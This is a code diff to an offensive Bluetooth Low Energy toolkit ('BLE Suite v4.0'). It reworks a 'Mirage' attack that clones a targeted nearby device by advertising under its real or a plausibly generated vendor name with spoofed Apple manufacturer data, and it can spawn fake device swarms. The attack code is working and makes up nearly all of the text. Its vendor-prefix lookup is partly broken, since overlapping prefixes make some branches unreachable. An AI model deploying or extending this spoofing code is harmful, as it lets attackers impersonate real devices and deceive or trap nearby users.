@@ -2,7 +2,7 @@
  * BLE Suite v4.0 - Complete BLE attack and analysis toolkit
  * Author: Ninja-jr
  * Version: 4.0
- * Last Updated: 24/08/2026
+ * Last Updated: 04/09/2026
  *
  * Contains: Smart device recon, connection caching, graduated connection
  *           strategies, robust GATT client, device fingerprinting,
@@ -52,6 +52,10 @@ static bool g_bleScanActive = false;
 
 // Device selection cache
 static SelectedDevice g_selectedDevice;
+
+// Name cache for device name resolution
+static std::map<String, String> deviceNameCache;
+static SemaphoreHandle_t nameCacheMutex = nullptr;
 
 //=============================================================================
 // Device Scoring System
@@ -4173,6 +4177,177 @@ void FastPairExploitEngine::generateRandomMac(uint8_t *mac) {
 }
 
 //=============================================================================
+// BLE Mirage Implementation
+//=============================================================================
+
+BLEMirage::BLEMirage() {}
+
+BLEMirage::~BLEMirage() {
+    stopAll();
+}
+
+String BLEMirage::generatePlausibleName(const String &address) {
+    String oui = address.substring(0, 8);
+    oui.toUpperCase();
+    
+    if (oui.startsWith("00:1E:DF") || oui.startsWith("00:23:E7") || 
+        oui.startsWith("00:24:FE") || oui.startsWith("00:26:5C") ||
+        oui.startsWith("00:27:14") || oui.startsWith("00:2A:10") ||
+        oui.startsWith("00:2D:0A") || oui.startsWith("00:30:FA") ||
+        oui.startsWith("00:35:FE") || oui.startsWith("00:3C:E4") ||
+        oui.startsWith("00:40:96") || oui.startsWith("00:44:01") ||
+        oui.startsWith("00:4A:77") || oui.startsWith("00:4D:4A") ||
+        oui.startsWith("00:50:F7")) {
+        return "Samsung Device";
+    } 
+    else if (oui.startsWith("00:24:FE") || oui.startsWith("00:26:5C") ||
+             oui.startsWith("00:30:FA") || oui.startsWith("00:35:FE") ||
+             oui.startsWith("00:3C:E4")) {
+        return "Apple Device";
+    } 
+    else if (oui.startsWith("00:40:96") || oui.startsWith("00:44:01")) {
+        return "Sony Device";
+    } 
+    else if (oui.startsWith("00:50:F7")) {
+        return "Microsoft Device";
+    } 
+    else if (oui.startsWith("00:54:08") || oui.startsWith("00:57:7A")) {
+        return "LG Device";
+    }
+    else if (oui.startsWith("00:5A:38") || oui.startsWith("00:5E:88")) {
+        return "Motorola Device";
+    }
+    else if (oui.startsWith("00:62:6E") || oui.startsWith("00:64:22")) {
+        return "Nokia Device";
+    }
+    else if (oui.startsWith("00:66:44") || oui.startsWith("00:68:EB")) {
+        return "Huawei Device";
+    }
+    else if (oui.startsWith("00:6A:94") || oui.startsWith("00:6C:F0")) {
+        return "Xiaomi Device";
+    }
+    else if (oui.startsWith("00:6E:2A") || oui.startsWith("00:70:89")) {
+        return "OnePlus Device";
+    }
+    else {
+        String suffix = address.substring(address.length() - 5);
+        suffix.replace(":", "");
+        if (suffix.length() >= 4) {
+            return "BT-" + suffix.substring(0, 4);
+        }
+        return "BLE Device";
+    }
+}
+
+void BLEMirage::updateKnownName(const String &address, const String &name) {
+    if (!name.isEmpty() && name != address && name != "Unknown" && name != "<no name>") {
+        knownDeviceNames[address] = name;
+    }
+}
+
+bool BLEMirage::spawnMirage(const String &targetAddress, const String &targetName) {
+    for (auto &inst : instances) {
+        if (inst.address == targetAddress && inst.active) {
+            return true;
+        }
+    }
+    
+    String spoofName = targetName;
+    
+    if (spoofName.isEmpty() || spoofName == targetAddress || spoofName == "Unknown" || spoofName == "<no name>") {
+        auto it = knownDeviceNames.find(targetAddress);
+        if (it != knownDeviceNames.end() && !it->second.isEmpty()) {
+            spoofName = it->second;
+        }
+    }
+    
+    if (spoofName.isEmpty() || spoofName == targetAddress || spoofName == "Unknown" || spoofName == "<no name>") {
+        spoofName = generatePlausibleName(targetAddress);
+    }
+    
+    if (spoofName.isEmpty() || spoofName == targetAddress) {
+        spoofName = "BLE Device";
+    }
+    
+    showAttackProgress(("Spoofing as: " + spoofName).c_str(), TFT_CYAN);
+    
+    BLEStateManager::deinitBLE(true);
+    delay(300);
+    BLEStateManager::initBLE(spoofName, ESP_PWR_LVL_P9);
+    
+    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
+    if (!pAdvertising) return false;
+    
+    MirageInstance inst;
+    inst.address = targetAddress;
+    inst.name = spoofName;
+    inst.originalName = targetName;
+    inst.startTime = millis();
+    inst.active = true;
+    inst.advertising = pAdvertising;
+    
+    pAdvertising->setName(spoofName.c_str());
+    pAdvertising->addServiceUUID(NimBLEUUID("1800"));
+    pAdvertising->addServiceUUID(NimBLEUUID("1801"));
+    
+    if (targetAddress.startsWith("00:1E:DF") || targetAddress.startsWith("00:23:E7") ||
+        targetAddress.startsWith("00:24:FE") || targetAddress.startsWith("00:26:5C")) {
+        pAdvertising->setAppearance(0x03C1);
+    } else if (targetAddress.startsWith("00:30:FA") || targetAddress.startsWith("00:35:FE")) {
+        pAdvertising->setAppearance(0x03C2);
+    }
+    
+    uint8_t appleData[] = {0x4C, 0x00, 0x02, 0x00, 0x01, 0x02, 0x03, 0x04};
+    pAdvertising->setManufacturerData(appleData, sizeof(appleData));
+    
+    pAdvertising->start(0);
+    
+    instances.push_back(inst);
+    return true;
+}
+
+void BLEMirage::createMirageNetwork(int count) {
+    for (int i = 0; i < count; i++) {
+        String addr = "AA:BB:CC:DD:" + String(i, HEX);
+        String name = "Network-" + String(i);
+        spawnMirage(addr, name);
+        delay(100);
+    }
+}
+
+void BLEMirage::stopMirage(const String &address) {
+    for (auto &inst : instances) {
+        if (inst.address == address && inst.active) {
+            if (inst.advertising) {
+                inst.advertising->stop();
+            }
+            inst.active = false;
+            break;
+        }
+    }
+}
+
+void BLEMirage::stopAll() {
+    for (auto &inst : instances) {
+        if (inst.active && inst.advertising) {
+            inst.advertising->stop();
+            inst.active = false;
+        }
+    }
+    instances.clear();
+    BLEStateManager::deinitBLE(true);
+}
+
+bool BLEMirage::isMirageActive(const String &address) {
+    for (auto &inst : instances) {
+        if (inst.address == address && inst.active) {
+            return true;
+        }
+    }
+    return false;
+}
+
+//=============================================================================
 // BLE Sniffer
 //=============================================================================
 
@@ -5321,95 +5496,6 @@ bool exportAttackLog() {
 }
 
 //=============================================================================
-// BLE Mirage Implementation
-//=============================================================================
-
-BLEMirage::BLEMirage() {}
-
-BLEMirage::~BLEMirage() {
-    stopAll();
-}
-
-bool BLEMirage::spawnMirage(const String &targetAddress, const String &spoofName) {
-    for (auto &inst : instances) {
-        if (inst.address == targetAddress && inst.active) {
-            return true;
-        }
-    }
-    
-    BLEStateManager::deinitBLE(true);
-    delay(300);
-    BLEStateManager::initBLE("Bruce-Mirage", ESP_PWR_LVL_P9);
-    
-    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
-    if (!pAdvertising) return false;
-    
-    MirageInstance inst;
-    inst.address = targetAddress;
-    inst.name = spoofName;
-    inst.startTime = millis();
-    inst.active = true;
-    inst.advertising = pAdvertising;
-    
-    pAdvertising->setName(spoofName.c_str());
-    pAdvertising->addServiceUUID(NimBLEUUID("1800"));
-    pAdvertising->addServiceUUID(NimBLEUUID("1801"));
-    
-    if (g_selectedDevice.address == targetAddress) {
-        pAdvertising->setAppearance(0x03C1);
-    }
-    
-    uint8_t appleData[] = {0x4C, 0x00, 0x02, 0x00, 0x01, 0x02, 0x03, 0x04};
-    pAdvertising->setManufacturerData(appleData, sizeof(appleData));
-    
-    pAdvertising->start(0);
-    
-    instances.push_back(inst);
-    return true;
-}
-
-void BLEMirage::createMirageNetwork(int count) {
-    for (int i = 0; i < count; i++) {
-        String addr = "AA:BB:CC:DD:" + String(i, HEX);
-        String name = "Mirage-" + String(i);
-        spawnMirage(addr, name);
-        delay(100);
-    }
-}
-
-void BLEMirage::stopMirage(const String &address) {
-    for (auto &inst : instances) {
-        if (inst.address == address && inst.active) {
-            if (inst.advertising) {
-                inst.advertising->stop();
-            }
-            inst.active = false;
-            break;
-        }
-    }
-}
-
-void BLEMirage::stopAll() {
-    for (auto &inst : instances) {
-        if (inst.active && inst.advertising) {
-            inst.advertising->stop();
-            inst.active = false;
-        }
-    }
-    instances.clear();
-    BLEStateManager::deinitBLE(true);
-}
-
-bool BLEMirage::isMirageActive(const String &address) {
-    for (auto &inst : instances) {
-        if (inst.address == address && inst.active) {
-            return true;
-        }
-    }
-    return false;
-}
-
-//=============================================================================
 // BleSuiteMenu
 //=============================================================================
 
@@ -6041,18 +6127,28 @@ void runMirageAttack(NimBLEAddress target) {
     BLEMirage mirage;
     String targetStr = String(target.toString().c_str());
     
-    showAttackProgress("Creating BLE mirage...", TFT_PURPLE);
-    
-    String name = g_selectedDevice.name;
-    if (name.isEmpty() || name == targetStr) {
-        name = "Mirage-" + targetStr.substring(targetStr.length() - 5);
+    String realName = "";
+    DeviceInfo info;
+    for (size_t i = 0; i < scannerData.size(); i++) {
+        if (scannerData.getDeviceInfo(i, info)) {
+            if (info.address == targetStr) {
+                realName = info.name;
+                break;
+            }
+        }
     }
     
-    if (mirage.spawnMirage(targetStr, name)) {
+    if (!realName.isEmpty() && realName != targetStr && realName != "Unknown" && realName != "<no name>") {
+        mirage.updateKnownName(targetStr, realName);
+    }
+    
+    showAttackProgress(("Creating mirage for: " + (realName.isEmpty() ? targetStr : realName)).c_str(), TFT_PURPLE);
+    
+    if (mirage.spawnMirage(targetStr, realName)) {
         std::vector<String> lines;
         lines.push_back("BLE MIRAGE ACTIVE");
         lines.push_back("Target: " + targetStr);
-        lines.push_back("Spoof: " + name);
+        lines.push_back("Spoofing as: " + (realName.isEmpty() ? "BLE Device" : realName));
         lines.push_back("");
         lines.push_back("Device is now being cloned");
         lines.push_back("Press any key to stop");
